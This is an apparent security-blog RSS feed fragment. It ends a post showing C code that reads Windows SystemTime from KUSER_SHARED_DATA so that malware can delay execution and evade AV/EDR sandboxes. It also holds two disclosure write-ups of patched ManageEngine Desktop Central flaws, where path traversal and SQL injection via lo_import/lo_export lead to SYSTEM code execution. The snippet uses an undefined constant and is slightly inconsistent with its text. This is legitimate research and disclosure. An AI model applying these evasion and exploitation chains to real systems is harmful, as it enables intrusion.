   &amp;#43;0x3a4 LangGenerationCount : Uint4B
   &amp;#43;0x3a8 Reserved4        : Uint8B
   &amp;#43;0x3b0 InterruptTimeBias : Uint8B
   &amp;#43;0x3b8 QpcBias          : Uint8B
   &amp;#43;0x3c0 ActiveProcessorCount : Uint4B
   &amp;#43;0x3c4 ActiveGroupCount : UChar
   &amp;#43;0x3c5 Reserved9        : UChar
   &amp;#43;0x3c6 QpcData          : Uint2B
   &amp;#43;0x3c6 QpcBypassEnabled : UChar
   &amp;#43;0x3c7 QpcShift         : UChar
   &amp;#43;0x3c8 TimeZoneBiasEffectiveStart : _LARGE_INTEGER
   &amp;#43;0x3d0 TimeZoneBiasEffectiveEnd : _LARGE_INTEGER
   &amp;#43;0x3d8 XState           : _XSTATE_CONFIGURATION
   &amp;#43;0x710 FeatureConfigurationChangeStamp : _KSYSTEM_TIME
   &amp;#43;0x71c Spare            : Uint4B&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;h2&gt;_KSystem_TIME Structure&lt;span class=&#34;absolute -mt-20&#34; id=&#34;_ksystem_time-structure&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#_ksystem_time-structure&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;The _KSYSTEM_TIME structure is relatively very simple, however, I figured it would still be useful to give the definition here.&lt;/p&gt;
&lt;p&gt;The structure (&lt;a href=&#34;https://www.nirsoft.net/kernel_struct/vista/KSYSTEM_TIME.html&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;credit&lt;/a&gt;) is defined as follows:&lt;/p&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt;typedef struct _KSYSTEM_TIME
{
     unsigned long LowPart;
     long High1Time;
     long High2Time;
} KSYSTEM_TIME, *PKSYSTEM_TIME;&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;h2&gt;SystemTime Attribute&lt;span class=&#34;absolute -mt-20&#34; id=&#34;systemtime-attribute&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#systemtime-attribute&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;The SystemTime attribute is in my personal opinion one of the most, if not the most useful attribute stored within the _KUSER_SHARED_DATA structure. SystemTime is a 100 nanosecond timer that is measured from Janurary 1st, 1601 of which is stored as a _KSYSTEM_TIME structure (as shown in the above definitions). It is important to note that this timer is affected by the timezone that the machine is using. Something I found interesting is that whilst SYSTEMTIME is 12 bytes in size, only the first 8 matter as High1Time and High2Time are both equal.&lt;/p&gt;
&lt;p&gt;On all version of Windows NT+, the SystemTime attribute is located at an offset of 0x14 from the beginning (0x7FFE0014).&lt;/p&gt;
&lt;h2&gt;How can this be abused?&lt;span class=&#34;absolute -mt-20&#34; id=&#34;how-can-this-be-abused&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#how-can-this-be-abused&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;This can be abused in a variety of ways, one of which is to use it as an alternative method of sleeping without use of any pre-defined functions. This is beneficial when looking to evade automated defense solutions such as Anti-Virus and EDR’s (Endpoint Detection and Response), reason being modern detection solutions will attempt to skip over, or patch out known sleep or pause methods in order to stop attackers from delaying execution of malicious code within a process. If an attacker is able to pull this off, they can evade most behavioural analysis measures via simply waiting so long that the sandbox closes and assumes the sample is benign.&lt;/p&gt;
&lt;h2&gt;Get Epoch Time Without Function Calls in C&lt;span class=&#34;absolute -mt-20&#34; id=&#34;get-epoch-time-without-function-calls-in-c&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#get-epoch-time-without-function-calls-in-c&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;In order to get epoch time (relative to the user’s timezone at least), we first need to get the start of Unix epoch in ticks. I’ve done this for you, it’s 0x019DB1DED53E8000. There really isn’t much to explain here, simply read the values from the SYSTEMTIME attribute of SharedUserData, subtract the unix time start in ticks, and divide to get the level of accuracy you wish for. In this case, I used 100000 as I wanted epoch in seconds.&lt;/p&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt;unsigned long long __get_timestamp()
{
	const size_t UNIX_TIME_START = 0x019DB1DED53E8000; // Start of Unix epoch in ticks.
	const size_t TICKS_PER_SECOND = 10000000; // A tick is 100ns.
	LARGE_INTEGER time;
	time.LowPart = *(DWORD*)(0x7FFE0000 &amp;#43; 0x14); // Read LowPart as unsigned long.
	time.HighPart = *(long*)(0x7FFE0000 &amp;#43; 0x1c); // Read High1Part as long.
	return (unsigned long long)((time.QuadPart - UNIX_TIME_START) / TICKS_PER_MILLISECOND);
}&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;This was thrown into a simple PoC, and you can see it working as follows:&lt;/p&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt;PS C:\Users\jorda\Desktop\tmp&amp;gt; .\poc.exe
__get_timestamp() -&amp;gt; 1656935008&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;h2&gt;Time-Dependent exploit development&lt;span class=&#34;absolute -mt-20&#34; id=&#34;time-dependent-exploit-development&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#time-dependent-exploit-development&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;Another way this can be abused is when developing exploits. The folk at Uninformed are able to explain this far better than myself, and thus if you want more than a general overview, &lt;a href=&#34;http://uninformed.org/index.cgi?v=2&amp;amp;a=2&amp;amp;p=21&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;click here&lt;/a&gt; for their post on this.&lt;/p&gt;
&lt;h2&gt;Conclusion&lt;span class=&#34;absolute -mt-20&#34; id=&#34;conclusion&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#conclusion&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;Whilst this is a fairly simple concept, I figured it would be cool to share as I quite enjoyed the use cases for defense evasion and exploitation purposes.&lt;/p&gt;

      </description>
    </item>
    
    <item>
      <title>(ZOHO) ManageEngine Desktop Central - Path Traversal / Arbitrary File Write</title>
      <link>//localhost:1313/articles/2022/08/2022-08-02-zoho-manageengine-desktop-central-path-traversal-arbitrary-file-write/</link>
      <pubDate>Tue, 02 Aug 2022 00:00:00 +0000</pubDate>
      
      <guid>//localhost:1313/articles/2022/08/2022-08-02-zoho-manageengine-desktop-central-path-traversal-arbitrary-file-write/</guid>
      <description>
        
        
        &lt;p&gt;&lt;strong&gt;Software&lt;/strong&gt;: Zoho ManageEngine Desktop Central&lt;br&gt;
&lt;strong&gt;Affected Versions&lt;/strong&gt;: Before 10.0.662&lt;br&gt;
&lt;strong&gt;Vendor page&lt;/strong&gt;: &lt;a href=&#34;https://www.manageengine.com/products/desktop-central/vulnerabilities-in-reports-module.html&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://www.manageengine.com/products/desktop-central/vulnerabilities-in-reports-module.html&lt;/a&gt;&lt;br&gt;
&lt;strong&gt;CVE Reference&lt;/strong&gt;: CVE-2021-46165 &amp;amp; CVE-2021-46166&lt;br&gt;
&lt;strong&gt;Published&lt;/strong&gt;: 09/01/2022&lt;br&gt;
&lt;strong&gt;CVSS 3.1 Score&lt;/strong&gt;: 8.8 High&lt;br&gt;
&lt;strong&gt;Attack Vector&lt;/strong&gt;: SQL Injection / Arbitrary File Write&lt;br&gt;
&lt;strong&gt;Credits&lt;/strong&gt;: Tom Ellson&lt;/p&gt;
&lt;p&gt;This is the second post in our two part series on ManageEngine Desktop Central. All of the reported issues have since been acknowledged and resolved by ManageEngine.&lt;/p&gt;
&lt;p&gt;JUMPSEC researchers have discovered multiple vulnerabilities in ManageEngine Desktop Central Application (MEDC). This is an endpoint management system that is used widely across the globe and is a prevalent vendor. Successful exploitation of these vulnerabilities would allow an adversary to execute code in the context of highest integrity (NT AUTHORITY / SYSTEM).&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;In this second post, we will explore ways of exploiting the issues identified in our previous post, to facilitate attack path traversal leveraging the vulnerabilities identified.&lt;/strong&gt;&lt;/p&gt;
&lt;h2&gt;&lt;strong&gt;Summary&lt;/strong&gt;&lt;span class=&#34;absolute -mt-20&#34; id=&#34;summary&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#summary&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;The application grants users full control over the &amp;ldquo;Images&amp;rdquo; and &amp;ldquo;Deployment&amp;rdquo; modules within the &amp;ldquo;OSD Controls&amp;rdquo;. This allows the user to add an application using the &amp;ldquo;add applications&amp;rdquo; control within the admin functionality of the &amp;ldquo;OS Deployment&amp;rdquo; tab.&lt;/p&gt;
&lt;p&gt;Once the user adds the application, the &amp;ldquo;&lt;em&gt;applicationsName&lt;/em&gt;&amp;rdquo; parameter is vulnerable to a path / directory traversal attack. This in turn allows an attacker or user with malicious intent to upload / write any file to the operating system with the highest integrity as SYSTEM. This can then be leveraged to cause denial of service or code execution as SYSTEM.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/2022-18-01-13-22-121804-MEDC-1024x186.png&#34; alt=&#34;2022 18 01 13 22 121804 MEDC&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;table&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;
&lt;h2&gt;&lt;strong&gt;Attack Path Traversal&lt;/strong&gt;&lt;span class=&#34;absolute -mt-20&#34; id=&#34;attack-path-traversal&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#attack-path-traversal&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;This attack chain begins with a POST request to the files API endpoint. This endpoint takes standard &lt;em&gt;webkitformboundary&lt;/em&gt; data. As there are no file upload restrictions, the endpoint can be used to upload all files inclusive of dll&amp;rsquo;s and exe’s. As seen below, the POST request to the &lt;em&gt;/emsapi/files&lt;/em&gt; endpoint allows for an exe file to be uploaded. Upon successful upload the endpoint returns JSON including the &lt;em&gt;fileID&lt;/em&gt;, &lt;em&gt;fileName&lt;/em&gt;, &lt;em&gt;customerID&lt;/em&gt;, &lt;em&gt;expiryDate&lt;/em&gt; and &lt;em&gt;fileStatus&lt;/em&gt;. Making note of the &lt;em&gt;fileID&lt;/em&gt; is important here as it is used in subsequent API requests.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/2022-11-01-13-22-121118-MEDC.png&#34; alt=&#34;2022 11 01 13 22 121118 MEDC&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;table&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;
&lt;p&gt;&lt;img src=&#34;images/2022-11-01-13-22-121128-MEDC.png&#34; alt=&#34;2022 11 01 13 22 121128 MEDC&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;The &lt;em&gt;/emsapi/files&lt;/em&gt; endpoint can be used to introduce any files to the system. Using this function, we attempted to introduce said files to a location other than the intended directory. The initial attempt at traversal on the files API endpoint was unsuccessful, as the filename parameter does not accept any form of path or directory traversal. This is controlled by file name checks on that parameter which prevents the usage of unicode characters and characters that can be used as a traversal technique.&lt;/p&gt;
&lt;p&gt;The &lt;em&gt;/emsapi/osdeployer/applications&lt;/em&gt; endpoint allows for the user to create a new “&lt;em&gt;application&lt;/em&gt;” in the system. Upon creation of an &lt;em&gt;application&lt;/em&gt;, a folder is created in the applications directory with the file that was uploaded in the previous API call that corresponds with the &lt;em&gt;fileID&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;The &lt;em&gt;applicationName&lt;/em&gt; is used as a basis to create the application directory folder, meaning traversal and identification of the created folder was trivial; developers often forget input sanitation that would prevent the traversal of the file system in order to create files and folders that should belong to the application directory.&lt;/p&gt;
&lt;p&gt;If an &lt;em&gt;applicationName&lt;/em&gt; is requested that already exists, the application folder will not be created but the file will still be written. Therefore the &lt;em&gt;system32&lt;/em&gt; directory can be used and the &lt;em&gt;system32&lt;/em&gt; folder will not be overwritten, but the file that pertains to the fileID will be uploaded into &lt;em&gt;system32&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/2022-44-01-13-22-124447-MEDC.png&#34; alt=&#34;2022 44 01 13 22 124447 MEDC&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;table&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;
&lt;p&gt;&lt;img src=&#34;images/2022-05-01-13-22-130555-MEDC.png&#34; alt=&#34;2022 05 01 13 22 130555 MEDC&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Upon issuing the above API call, the previously uploaded file (&lt;em&gt;tomtest1.exe&lt;/em&gt; - &lt;em&gt;fileID&lt;/em&gt; 29) is written to the &lt;em&gt;C:\windows\system32&lt;/em&gt;\ directory. At this point we had proved arbitrary file write through the application creation endpoint. As per the figure below, the file is being written with the highest file integrity - “NT AUTHORITY\SYSTEM”. Upon file creation, the &lt;em&gt;java.exe&lt;/em&gt; binary creates the file and sets the owner to the local administrator&amp;rsquo;s group.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/pasted-image-0-6-1024x554.png&#34; alt=&#34;pasted image 0 6&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;table&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;
&lt;p&gt;&lt;img src=&#34;images/2022-09-01-13-22-130940-MEDC.png&#34; alt=&#34;2022 09 01 13 22 130940 MEDC&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Upon achieving arbitrary file write, it&amp;rsquo;s important to understand the scope of what can be achieved. Arbitrary File Write (AFW) differs from Arbitrary File Overwrite (AFO). File overwrite is more beneficial to us as we don&amp;rsquo;t really need to find a binary that is called upon file service execution. &lt;/p&gt;
&lt;p&gt;However, in this case we had AFW and not AFO, so it was necessary to find an executable or dll that is loaded at run time but was not present on the system. This could be done using first order dll hijacking. However, we opted for an approach similar to what was described &lt;a href=&#34;http://google.com&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;here&lt;/a&gt; The following Java.com binary is missing from the system at service start time.&lt;/p&gt;
&lt;h2&gt;&lt;strong&gt;Summary&lt;/strong&gt;&lt;span class=&#34;absolute -mt-20&#34; id=&#34;summary-1&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#summary-1&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;&lt;img src=&#34;images/pasted-image-0-2-1.png&#34; alt=&#34;pasted image 0 2 1&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;This Arbitrary File Write allows for complete control over the Manage Engine Desktop Central Server as it can be used to execute code.&lt;/p&gt;
&lt;p&gt;Whilst this attack requires some levels of privilege to have been obtained already and access to the application creation functionality. This functionality can be abused to achieve code execution at service start time. &lt;/p&gt;
&lt;p&gt;This has been reported to the vendor and has been fixed as of the most recent version. The vendor was comprehensive with remediation and quick to respond issues outlined.&lt;/p&gt;

      </description>
    </item>
    
    <item>
      <title>(ZOHO) ManageEngine Desktop Central – SQL Injection / Arbitrary File Write</title>
      <link>//localhost:1313/articles/2022/08/2022-08-02-zoho-manage-engine-desktop-central-sql-injection-arbitrary-file-write/</link>
      <pubDate>Tue, 02 Aug 2022 00:00:00 +0000</pubDate>
      
      <guid>//localhost:1313/articles/2022/08/2022-08-02-zoho-manage-engine-desktop-central-sql-injection-arbitrary-file-write/</guid>
      <description>
        
        
        &lt;p&gt;&lt;strong&gt;Software&lt;/strong&gt;: Zoho ManageEngine Desktop Central&lt;br&gt;
&lt;strong&gt;Affected Versions&lt;/strong&gt;: Before 10.0.662&lt;br&gt;
&lt;strong&gt;Vendor page&lt;/strong&gt;: &lt;a href=&#34;https://www.manageengine.com/products/desktop-central/vulnerabilities-in-reports-module.html&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://www.manageengine.com/products/desktop-central/vulnerabilities-in-reports-module.html&lt;/a&gt;&lt;br&gt;
&lt;strong&gt;CVE Reference&lt;/strong&gt;: CVE-2021-46164&lt;br&gt;
&lt;strong&gt;Published&lt;/strong&gt;: 09/01/2022&lt;br&gt;
&lt;strong&gt;CVSS 3.1 Score&lt;/strong&gt;: 8.8 High&lt;br&gt;
&lt;strong&gt;Attack Vector&lt;/strong&gt;: SQL Injection / Arbitrary File Write&lt;br&gt;
&lt;strong&gt;Credits&lt;/strong&gt;: Tom Ellson&lt;/p&gt;
&lt;p&gt;This is the first post in a two part series on Manage Engine Desktop Central. All of the reported issues have since been acknowledged and resolved by Managed Engine.&lt;/p&gt;
&lt;h2&gt;&lt;strong&gt;Summary&lt;/strong&gt;&lt;span class=&#34;absolute -mt-20&#34; id=&#34;summary&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#summary&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;Whilst logged in as a user who has full control over the &amp;ldquo;reporting&amp;rdquo; module within Desktop Central, an attacker could directly query the underlying Postgres DB.&lt;/p&gt;
&lt;p&gt;By default, queries are made by the &amp;ldquo;dcuser&amp;rdquo; user. This user is a database administrator and has unrestricted access to all tables and databases within the postgres instance. Therefore, this user can use the built in server side functions &lt;em&gt;lo_import&lt;/em&gt; and &lt;em&gt;lo_export&lt;/em&gt; to achieve arbitrary file write. &lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;a href=&#34;https://srcincite.io/blog/2020/06/26/sql-injection-double-uppercut-how-to-achieve-remote-code-execution-against-postgresql.html&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Here&lt;/a&gt; is some great content on the abuse of &lt;em&gt;lo_import&lt;/em&gt; and &lt;em&gt;lo_export&lt;/em&gt;.&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;&lt;em&gt;lo_import&lt;/em&gt; can be used to import any file system both on the server and hosted on an attacker-controlled SMB share via UNC path. Following this, it is possible to use &lt;em&gt;lo_export&lt;/em&gt; to write the file anywhere on the system; as the &lt;em&gt;postgres&lt;/em&gt; service is running as NT AUTHORITY SYSTEM, the owner property of this file was set to SYSTEM with the highest integrity. This also means that a malicious user is able to write any file on the system to the Desktop Central base directory and could then browse to the web root to retrieve its contents. &lt;/p&gt;
&lt;p&gt;In order to achieve code execution JUMPSEC observed that when the &lt;em&gt;UEMS.exe&lt;/em&gt; service stops or starts it attempts to run the &amp;ldquo;&lt;em&gt;java.com&lt;/em&gt;&amp;rdquo; executable from the &lt;em&gt;&amp;ldquo;C:\program files\desktopcentral_server\jre\bin\&lt;/em&gt;&amp;rdquo; directory. By default, &lt;em&gt;java.com&lt;/em&gt; is not present, meaning that JUMPSEC could write a executable file named &lt;em&gt;java.com&lt;/em&gt; to that location and hence it will be executed at the service start time. This file is executed as NT AUTHORITY SYSTEM meaning that code execution is achieved with the highest integrity. &lt;/p&gt;
&lt;h4&gt;Attack Path&lt;span class=&#34;absolute -mt-20&#34; id=&#34;attack-path&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#attack-path&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;SQL injection executing the &lt;em&gt;lo_import&lt;/em&gt; to import a malicious executable into the large objects on the Postgres DB, and then using &lt;em&gt;lo_export&lt;/em&gt; to export them to anywhere on the underlying operating system.&lt;/li&gt;
&lt;li&gt;Writing the attacker-controlled exe to the &amp;ldquo;&lt;em&gt;C:\program files\desktopcentral_server\jre\bin\&lt;/em&gt;&amp;rdquo; directory as &lt;em&gt;java.com.&lt;/em&gt;&lt;/li&gt;
&lt;li&gt;Waiting for the service to restart.&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;&lt;strong&gt;Arbitrary File Write - Query Report&lt;/strong&gt;&lt;span class=&#34;absolute -mt-20&#34; id=&#34;arbitrary-file-write---query-report&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#arbitrary-file-write---query-report&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;&lt;img src=&#34;images/2022-23-01-13-22-132345-MEDC-1024x304.png&#34; alt=&#34;2022 23 01 13 22 132345 MEDC&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;It was apparent that the &lt;em&gt;query&lt;/em&gt; field was directly querying the database. This was determined by running &amp;ldquo;SELECT 1&amp;rdquo; within the query field. &lt;/p&gt;
&lt;p&gt;From here it was trivial to weaponise. The first step was to enumerate the postgres service and which user was being used to run the queries:&lt;/p&gt;
&lt;h4&gt;Post Request to Enumerate The Current User&lt;span class=&#34;absolute -mt-20&#34; id=&#34;post-request-to-enumerate-the-current-user&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#post-request-to-enumerate-the-current-user&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h4&gt;&lt;p&gt;&lt;img src=&#34;images/2022-21-01-13-22-132104-MEDC-1024x541.png&#34; alt=&#34;2022 21 01 13 22 132104 MEDC&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;h4&gt;Post Request to Enumerate The Postgres Users&lt;span class=&#34;absolute -mt-20&#34; id=&#34;post-request-to-enumerate-the-postgres-users&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#post-request-to-enumerate-the-postgres-users&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h4&gt;&lt;p&gt;&lt;img src=&#34;images/2022-09-01-13-22-170905-MEDC-1024x515.png&#34; alt=&#34;2022 09 01 13 22 170905 MEDC&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;The queries were being run as &lt;em&gt;dcuser&lt;/em&gt;, who is a &lt;em&gt;superadmin&lt;/em&gt;. From here there was multiple avenues that could be explored to extract data from the database, firstly we attempted to take the password hashes from the pg_shadow table:&lt;/p&gt;
&lt;h4&gt;Post Request to Enumerate The Hashes from the pgshadow Table&lt;span class=&#34;absolute -mt-20&#34; id=&#34;post-request-to-enumerate-the-hashes-from-the-pgshadow-table&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#post-request-to-enumerate-the-hashes-from-the-pgshadow-table&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h4&gt;&lt;p&gt;&lt;img src=&#34;https://lh3.googleusercontent.com/kptuqs-9m2IsS43b98BBB3FHHUpSsS8ooConcQ4EWgPkxBBk-bnHv-v-Ng7gt8qglMiIpRZzQHTw9ZuztO8Adyp9UV5X74UBvLSDmQ9dsqwCWMKuJHq5N-61BfLc-m2ILULTA9tR&#34; alt=&#34;&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;This would still require us to be able to crack the hashes or additional steps on the attack path, it&amp;rsquo;s also likely that the &lt;em&gt;postgres&lt;/em&gt; service is limited to localhost.&lt;/p&gt;
&lt;p&gt;Usually in this situation we attempted to create a function in order to execute code. This wasn&amp;rsquo;t possible due to server side validation ensuring that only &lt;em&gt;SELECT&lt;/em&gt; commands could be used within the query. It was apparent that we would have to use the server-side functionality that is built into POSTGRES, and as such lo_import and lo_export were explored.&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.postgresql.org/docs/9.1/lo-funcs.html&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;lo_import and lo_export&lt;/a&gt; seemed a good candidate for being able to read and write files, so we dropped &lt;em&gt;secretfile.txt&lt;/em&gt; onto the administrator desktop to attempt to use lo_import to import it into large objects. &lt;/p&gt;
&lt;h4&gt;Post Request using lo_import&lt;span class=&#34;absolute -mt-20&#34; id=&#34;post-request-using-lo_import&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#post-request-using-lo_import&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h4&gt;&lt;p&gt;&lt;img src=&#34;images/pasted-image-0-4-1-1024x409.png&#34; alt=&#34;pasted image 0 4 1&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;table&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;
&lt;p&gt;&lt;img src=&#34;images/2022-16-01-13-22-171659-MEDC.png&#34; alt=&#34;2022 16 01 13 22 171659 MEDC&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;p&gt;The response from the query was the OID number of the large object that had been imported. This is important because it will need to be used to identify the large object within the lo_export command.&lt;/p&gt;
&lt;p&gt;The obvious next step is to write this file to the web root, however there was an issue writing a &lt;em&gt;jsp&lt;/em&gt; shell to the web root. JUMPSEC determined this was due to restrictions in the java configuration and no further digging was done.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;images/pasted-image-0-6-1.png&#34; alt=&#34;pasted image 0 6 1&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
&lt;table&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;
&lt;p&gt;&lt;img src=&#34;images/pasted-image-0-7.png&#34; alt=&#34;pasted image 0 7&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
